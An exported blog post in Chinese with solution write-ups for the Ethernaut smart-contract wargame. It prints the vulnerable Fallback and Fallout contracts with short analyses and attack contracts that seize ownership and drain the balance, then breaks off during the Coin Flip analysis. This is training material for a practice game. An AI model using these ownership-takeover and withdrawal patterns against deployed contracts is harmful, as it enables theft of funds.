{"title":"Ethernaut","uid":"d254f0c02017b2eb8e14e9b15540cca1","slug":"ethernaut","date":"2022-08-02T02:42:37.160Z","updated":"2022-08-02T02:42:37.160Z","comments":true,"path":"api/articles/ethernaut.json","keywords":null,"cover":[],"content":"<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images1/img/202208011808700.svg\"></p>\n<span id=\"more\"></span>\n\n<p>地址<a href=\"https://ethernaut.openzeppelin.com/\">https://ethernaut.openzeppelin.com/</a></p>\n<h1 id=\"1-fallback\"><a href=\"#1-fallback\" class=\"headerlink\" title=\"1.fallback\"></a>1.fallback</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：获得合约所有权并将余额变成0</p></blockquote>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Fallback</span> <span class=\"token punctuation\">&#123;</span>\n\n  <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> contributions<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    contributions<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1000</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">modifier</span> onlyOwner <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> owner<span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"caller is not the owner\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">contribute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">&lt;</span> <span class=\"token number\">0.001</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    contributions<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>contributions<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> contributions<span class=\"token punctuation\">[</span>owner<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">getContribution</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> contributions<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> onlyOwner <span class=\"token punctuation\">&#123;</span>\n    owner<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token function\">receive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> contributions<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyze\"><a href=\"#Analyze\" class=\"headerlink\" title=\"Analyze\"></a>Analyze</h2><p>存在，接受转账后触发fallback函数，题目合约中的receive函数</p>\n<h2 id=\"Attack\"><a href=\"#Attack\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"e1.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span> <span class=\"token punctuation\">&#123;</span>\n    Fallback <span class=\"token keyword\">public</span> e<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> a <span class=\"token operator\">=</span> <span class=\"token number\">0xd9145CCE52D386f254917e481eB44e9943F39138</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> fallbackaddress<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">&#123;</span>e<span class=\"token operator\">=</span><span class=\"token function\">Fallback</span><span class=\"token punctuation\">(</span>fallbackaddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getcontribution</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n       e<span class=\"token punctuation\">.</span>contribute<span class=\"token punctuation\">&#123;</span>value<span class=\"token punctuation\">:</span><span class=\"token number\">0.0001</span> ether<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">changeowner</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        a<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">&#123;</span>value<span class=\"token punctuation\">:</span><span class=\"token number\">0.0001</span> ether<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//a.send(0.0001 ether);</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getmoney</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n        e<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"2-fallout\"><a href=\"#2-fallout\" class=\"headerlink\" title=\"2.fallout\"></a>2.fallout</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：获得以下合约的所有权</p></blockquote>\n<h2 id=\"Code-1\"><a href=\"#Code-1\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Fallout</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> allocations<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\n\n\n  <span class=\"token comment\">/* constructor */</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">Fal1out</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n    owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    allocations<span class=\"token punctuation\">[</span>owner<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">modifier</span> onlyOwner <span class=\"token punctuation\">&#123;</span>\n\t        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n\t            msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> owner<span class=\"token punctuation\">,</span>\n\t            <span class=\"token string\">\"caller is not the owner\"</span>\n\t        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n\t    <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">allocate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n    allocations<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> allocations<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">sendAllocation</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> allocator<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>allocations<span class=\"token punctuation\">[</span>allocator<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    allocator<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>allocations<span class=\"token punctuation\">[</span>allocator<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">collectAllocations</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> onlyOwner <span class=\"token punctuation\">&#123;</span>\n    msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">allocatorBalance</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> allocator<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> allocations<span class=\"token punctuation\">[</span>allocator<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyze-1\"><a href=\"#Analyze-1\" class=\"headerlink\" title=\"Analyze\"></a>Analyze</h2><p>Fal1out()函数没有进行onlyowner限制，只要调用即可获得更改owner</p>\n<h2 id=\"Attack-1\"><a href=\"#Attack-1\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"e2.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span><span class=\"token punctuation\">&#123;</span>\n    Fallout <span class=\"token keyword\">public</span> e<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">constructor</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> falloutaddress<span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>e<span class=\"token operator\">=</span><span class=\"token function\">Fallout</span><span class=\"token punctuation\">(</span>falloutaddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getowner</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n        e<span class=\"token punctuation\">.</span>Fal1out<span class=\"token punctuation\">&#123;</span>value<span class=\"token punctuation\">:</span><span class=\"token number\">1</span> wei<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"2-coin-flip\"><a href=\"#2-coin-flip\" class=\"headerlink\" title=\"2.coin flip\"></a>2.coin flip</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：这是一个掷硬币的游戏，你需要连续的猜对结果。完成这一关，你需要通过你的超能力来连续猜对十次。</p></blockquote>\n<h2 id=\"Code-2\"><a href=\"#Code-2\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">CoinFlip</span> <span class=\"token punctuation\">&#123;</span>\n\n  <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> consecutiveWins<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">uint256</span> lastHash<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">uint256</span> FACTOR <span class=\"token operator\">=</span> <span class=\"token number\">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    consecutiveWins <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> _guess<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">uint256</span> blockValue <span class=\"token operator\">=</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token function\">blockhash</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>number<span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>lastHash <span class=\"token operator\">==</span> blockValue<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">revert</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    lastHash <span class=\"token operator\">=</span> blockValue<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> coinFlip <span class=\"token operator\">=</span> blockValue<span class=\"token punctuation\">.</span><span class=\"token function\">div</span><span class=\"token punctuation\">(</span>FACTOR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">bool</span> side <span class=\"token operator\">=</span> coinFlip <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token operator\">?</span> <span class=\"token boolean\">true</span> <span class=\"token punctuation\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>side <span class=\"token operator\">==</span> _guess<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      consecutiveWins<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n      consecutiveWins <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyze-2\"><a href=\"#Analyze-2\" class=\"headerlink\" title=\"Analyze\"></a>Analyze</h2><p><img 